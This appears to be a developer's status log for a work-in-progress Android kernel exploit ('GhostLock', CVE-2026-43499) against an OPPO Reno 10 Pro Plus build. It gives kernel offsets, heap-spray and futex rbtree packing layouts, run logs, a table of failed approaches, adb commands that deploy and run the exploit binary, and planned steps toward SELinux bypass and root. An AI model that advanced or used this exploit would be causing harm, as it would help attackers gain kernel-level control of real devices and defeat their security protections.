# CPH2521 closest plateau — freeze for GitHub (2026-08-02)

**Device:** OPPO Reno 10 Pro Plus (CPH2521)  
**Build:** CPH2521_16.0.5.1002(EX01)  
**Kernel:** `5.10.236-android12-9-o-g74d132f4467a`  
**CVE:** GhostLock / CVE-2026-43499  
**Binary:** `ghostlock-cph2521` (build via `build_cph2521.ps1`)

## Save-test (2026-08-02 evening) — **CONFIRMED**

Clean reboot, `MODE4_ONLY=1 KPHYS=0xa8000000 FOPS_MAX_ATTEMPTS=12`:

```text
mode4 BASELINE t0 W0 main=1,0,0 pi=1,0,0 pi_waiters=0
pselect place … lock=fake_lock  (shift=-2 wps=5 OK)
post-select ret=5 success=1 delay=50000
cfi write ret=-1 errno=22
ALIVE
```

Log: `logs/plateau_saved.txt`  
Binary: `ghostlock-cph2521` (~122120 bytes)

**Fix that restored the plateau:** mode4 consumer delay was forced to 0 → race softboot.  
Now default ≥50 ms delay; FUTEX_LOCK_PI punch opt-in only (`MODE4_FUTEX_PUNCH=1`).

---

## Cross-check (2026-08-02 afternoon)

| Log | Packing | Result |
|-----|---------|--------|
| `logs/t0_last.txt` | DIG no-gadget, pi_waiters=0, stack clean | **post-select success=1, cfi errno=22, alive** |
| `logs/t0_nogadget.txt` | no-gadget + on_rq=0 | **post-select ret=0 success=0, alive** |
| recent SURVIVE / dig / LOCK_EMPTY | same inert or worse | softboot at select |

**Conclusion:** Real closest is **t0_last baseline**, not dig-with-MISC. Softboot of inert packing is either flaky race (consumer×owner) or misread overlay — not “write gadget required.”

### Recovery code (implemented)

1. Default packing = **t0 BASELINE** (W0 1,0,0 / pi 1,0,0 / pi_waiters=0).  
2. **fdset placement audit** logs `task`/`lock` at out[1]/out[2] (shift=-2, wps=5).  
3. **`MODE4_NO_CONSUMER=1`** — no sched_setattr punch during select (isolate softboot source).  
4. Dig/MISC/two-node/`pi_waiters=1` remain **env-only**.

---

## What “closest” means (proven)

| Milestone | Status |
|-----------|--------|
| Offsets / CFI JT / fops open@0x70 | matched |
| KPHYS `0xa8000000`, KIMAGE `0xffffffc008000000` | OK |
| mm 0x3c0 order-2, waiter task@0x30 pi@0x18 | OK |
| **PSELECT_SHIFT = -2** | survives overlay |
| Heap spray + requeue + pselect route | **success=1** (often) |
| CFI: open fake ashmem path | OK |
| **CFI write** | **`ret=-1 errno=22`** (no fops redirect) |
| Softboot with default packing | should not (see caveats) |

### errno 22

Real `ashmem_fops` has no `.write`. Open succeeds + pwrite EINVAL ⇒  
**`ashmem_misc.fops` was never replaced by `fake_fops`.**  
Route success ≠ write landed.

---

## Default packing (reverted)

```text
stack (5.10 words): main=0,0,0  pi=0,0,0  task=init_task(P0)  lock=fake_lock
heap W0 main:       1, 0, 0
heap W0.pi:         parent=fake_fops|RED, right=MISC_FOPS(P0), left=0
fake_task.pi_waiters: 0, 0
fake_task.on_rq@0x80: 0
waiter_task:        init_task (not fake_task)
PSELECT_SHIFT:      -2 (build default)
KPHYS:              0xa8000000
SKB_DATA_DELTA:     -0xe80
MODE4_ONLY=1 for one-shot tests
```

Log line to expect:

```text
mode4 CLOSEST dig W0.pi parent=…(fake_fops) right=…(MISC) left=0 pi_waiters=0
→ expect route+cfi errno=22 until write path fixed
```

---

## Hard negatives (do not re-open without new evidence)

| Experiment | Result |
|------------|--------|
| `fake_task.pi_waiters` → any node (even W0.pi=1,0,0) | **softboot** at select |
| Two-node SAFE/GADGET on W0.pi→W1 | softboot (even pi_waiters=0) |
| Classic single-node parent=MISC-8 as root | softboot |
| Stack MAIN/PI write gadget with MISC | softboot |
| Stack main=1 (vs 0) | T0 fail historically |
| PSELECT_SHIFT=0 | softboot at overlay |
| `MODE4_NO_GADGET` + pi_waiters=0 | survives; cfi 22 or route miss |

**Implication:** write must not rely on walking `fake_task.pi_waiters`.  
IonStack-style: **pi_waiters=0**, write via erase of a node the kernel actually unlinks (stack/lock path) — still open on CPH.

---

## Reproduce

```powershell
cd ghostlock-oneplus
.\build_cph2521.ps1
# hard reboot phone; uptime < 45s
adb push ghostlock-cph2521 /data/local/tmp/a/e
adb shell "chmod 755 /data/local/tmp/a/e"
adb shell "timeout 120s sh -c 'MODE4_ONLY=1 KPHYS=0xa8000000 FOPS_MAX_ATTEMPTS=12 /data/local/tmp/a/e'"
```

**Success criteria for this plateau:** device stays up; log contains  
`pselect … success=1` and `cfi write ret=-1 errno=22`  
(or route quality miss without softboot).

**Not success:** softboot, or cfi write ret≥0 (that would be past this plateau).

---

## Bundle

See `github-bundle/` (sources + binary + this doc + build script).

Optional monitor: `adb_status_monitor.ps1 -AutoHardRebootOnSoftboot`

---

## Next research (after this freeze)

1. Fire write without `pi_waiters` — lock.waiters erase of stack node carrying gadget post-`rb_link`, or other 5.10 path.  
2. Do not thrash SHIFT / two-node / pi_waiters link matrices.  
3. Only after `cfi write errno=0`: repair_llseek, SELinux, UMH/root.
